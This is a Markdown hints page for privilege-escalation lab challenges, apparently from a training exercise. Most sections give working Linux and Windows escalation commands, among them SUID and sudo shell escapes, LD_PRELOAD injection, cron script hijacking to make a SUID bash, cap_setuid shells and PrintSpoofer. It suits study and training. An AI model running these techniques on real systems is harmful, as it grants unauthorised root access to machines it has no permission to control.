# Privilege Escalation Hints

Progressive hints to help you through privilege escalation challenges.

---

## General Hints

### Hint 1: Always Start with Enumeration

Before trying any exploits, gather information:
```bash
id
whoami
uname -a
cat /etc/*release*
```

### Hint 2: Easy Wins First

Check these quick options before diving deeper:
1. `sudo -l` - What can you run with sudo?
2. SUID binaries - Any exploitable ones?
3. Readable sensitive files - /etc/shadow, SSH keys?

### Hint 3: Use Automated Tools

When manual checks don't reveal anything:
```bash
# Linux
./linpeas.sh

# Windows
.\winpeas.exe
```

---

## Linux SUID Hints

### Finding SUID Binaries

<details>
<summary>Hint 1: Basic SUID search</summary>

```bash
find / -perm -4000 -type f 2>/dev/null
```
The `-perm -4000` finds files with SUID bit set.
</details>

<details>
<summary>Hint 2: Understanding permissions</summary>

```bash
# Example: -rwsr-xr-x
# The 's' in position 4 means SUID is set
# This binary runs as the owner (usually root)
```
</details>

<details>
<summary>Hint 3: Where to look for exploits</summary>

Go to [GTFOBins](https://gtfobins.github.io/) and search for each binary you find.

Common exploitable binaries:
- find, vim, python, perl
- nmap (old), less, more
- env, awk, tar, zip
</details>

### Exploiting SUID

<details>
<summary>Hint 1: The -p flag</summary>

When exploiting SUID binaries to get a shell, use the `-p` flag:
```bash
/bin/bash -p
/bin/sh -p
```
The `-p` preserves the effective UID (root).
</details>

<details>
<summary>Hint 2: If find has SUID</summary>

```bash
find . -exec /bin/sh -p \; -quit
```
</details>

<details>
<summary>Hint 3: If vim has SUID</summary>

```bash
vim -c ':!/bin/sh -p'
# Or inside vim:
:set shell=/bin/sh
:shell
```
</details>

---

## Sudo Hints

### Checking Permissions

<details>
<summary>Hint 1: Basic sudo check</summary>

```bash
sudo -l
```
This shows what you can run with sudo.
</details>

<details>
<summary>Hint 2: Understanding the output</summary>

```
(ALL) NOPASSWD: /usr/bin/vim
```
- `(ALL)` - Can run as any user
- `NOPASSWD` - No password required
- `/usr/bin/vim` - The specific binary
</details>

<details>
<summary>Hint 3: Wildcards are dangerous</summary>

If you see something like:
```
(root) NOPASSWD: /usr/bin/find *
```
The wildcard (`*`) means you can add any arguments!
</details>

### Exploiting Sudo

<details>
<summary>Hint 1: Sudo vim</summary>

```bash
sudo vim -c ':!/bin/bash'
```
The `-c` flag executes a command when vim starts.
</details>

<details>
<summary>Hint 2: Sudo less/more</summary>

```bash
sudo less /etc/passwd
!/bin/bash
```
The `!` in less/more runs a shell command.
</details>

<details>
<summary>Hint 3: LD_PRELOAD exploitation</summary>

If you see `env_keep+=LD_PRELOAD`:
1. Create a shared library that spawns a shell
2. Compile with: `gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles`
3. Run: `sudo LD_PRELOAD=/tmp/shell.so <allowed_command>`
</details>

---

## Kernel Exploit Hints

<details>
<summary>Hint 1: Check kernel version</summary>

```bash
uname -r
uname -a
```
Note the version for searching exploits.
</details>

<details>
<summary>Hint 2: Use exploit suggester</summary>

```bash
./linux-exploit-suggester.sh
```
It will show potential kernel exploits.
</details>

<details>
<summary>Hint 3: Common vulnerabilities by version</summary>

| Kernel Version | Potential Exploit |
|----------------|-------------------|
| 2.6.22 - 4.8.3 | Dirty COW |
| 5.8 - 5.16.11 | Dirty Pipe |
| Many | PwnKit (polkit) |
</details>

<details>
<summary>Hint 4: Be careful with kernel exploits</summary>

- They can crash the system
- Always have a backup plan
- Test in a safe environment first
- Consider other methods before kernel exploits
</details>

---

## Cron Job Hints

<details>
<summary>Hint 1: Finding cron jobs</summary>

```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
crontab -l
```
</details>

<details>
<summary>Hint 2: Watching for cron jobs</summary>

If you can't see the crontab, monitor processes:
```bash
# Download and run pspy
./pspy64

# Manual method
watch -n 1 'ps aux | grep -v watch'
```
</details>

<details>
<summary>Hint 3: Writable script exploitation</summary>

If a root cron runs a script you can write to:
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/script.sh
# Wait for cron to run
/tmp/rootbash -p
```
</details>

<details>
<summary>Hint 4: PATH hijacking</summary>

If crontab sets a custom PATH:
```bash
# Check PATH in /etc/crontab
# If your home is in PATH before system directories:
echo '#!/bin/bash' > ~/tar
echo 'id > /tmp/pwned' >> ~/tar
chmod +x ~/tar
# Wait for cron to run
```
</details>

---

## Capabilities Hints

<details>
<summary>Hint 1: Finding capabilities</summary>

```bash
getcap -r / 2>/dev/null
```
</details>

<details>
<summary>Hint 2: Dangerous capabilities</summary>

Most dangerous:
- `cap_setuid` - Can change UID
- `cap_setgid` - Can change GID
- `cap_dac_read_search` - Can read any file
- `cap_dac_override` - Can write any file
</details>

<details>
<summary>Hint 3: Exploiting cap_setuid</summary>

```bash
# Python with cap_setuid
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'

# Perl with cap_setuid
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```
</details>

---

## Windows Hints

### Unquoted Service Paths

<details>
<summary>Hint 1: Finding vulnerable services</summary>

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"
```
</details>

<details>
<summary>Hint 2: Understanding the vulnerability</summary>

If path is: `C:\Program Files\My App\service.exe`

Windows tries:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe`

Place your malicious exe at one of the earlier paths.
</details>

<details>
<summary>Hint 3: Check write permissions</summary>

```powershell
icacls "C:\Program Files"
# Look for (W) or (F) for your user
```
</details>

### Token Impersonation

<details>
<summary>Hint 1: Check privileges</summary>

```powershell
whoami /priv
```
Look for `SeImpersonatePrivilege`.
</details>

<details>
<summary>Hint 2: Common tools</summary>

- PrintSpoofer (Windows 10/Server 2016+)
- JuicyPotato (Windows 7-10, Server 2008-2019)
- RoguePotato (Windows 10/Server 2019)
- GodPotato (newer Windows)
</details>

<details>
<summary>Hint 3: Basic PrintSpoofer usage</summary>

```powershell
.\PrintSpoofer64.exe -i -c cmd.exe
```
</details>

---

## Troubleshooting

### Exploit doesn't work

<details>
<summary>Solution 1: Check prerequisites</summary>

- Is the binary actually SUID/has capabilities?
- Are you using the correct syntax?
- Does the exploit match the kernel/system version?
</details>

<details>
<summary>Solution 2: Try variations</summary>

```bash
# Different shells
/bin/bash -p
/bin/sh -p
/bin/dash

# Different methods
find . -exec /bin/sh \; -quit
find / -name anything -exec /bin/sh \; -quit
```
</details>

### Permission denied

<details>
<summary>Solution</summary>

- Check you're targeting the right binary
- Verify SUID bit: `ls -la /path/to/binary`
- Check it's owned by root
- Check the `s` is lowercase (executable)
</details>

### Shell dies immediately

<details>
<summary>Solution</summary>

```bash
# Use -p flag to preserve privileges
/bin/bash -p

# Or try stabilizing
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
</details>

---

## Quick Reference

### Linux Commands Cheat Sheet

| Check | Command |
|-------|---------|
| Current user | `id` |
| Sudo permissions | `sudo -l` |
| SUID binaries | `find / -perm -4000 2>/dev/null` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Cron jobs | `cat /etc/crontab` |
| Kernel version | `uname -r` |
| Running processes | `ps aux` |
| Network connections | `ss -tulpn` |
| Writable files | `find / -writable 2>/dev/null` |

### Windows Commands Cheat Sheet

| Check | Command |
|-------|---------|
| Current user | `whoami /all` |
| Privileges | `whoami /priv` |
| Groups | `net localgroup administrators` |
| Services | `wmic service get name,pathname,startmode` |
| Scheduled tasks | `schtasks /query /fo LIST` |
| Installed software | `wmic product get name,version` |
| System info | `systeminfo` |

---

**Back to:** [README](./README.md) | [Walkthrough](./walkthrough.md)
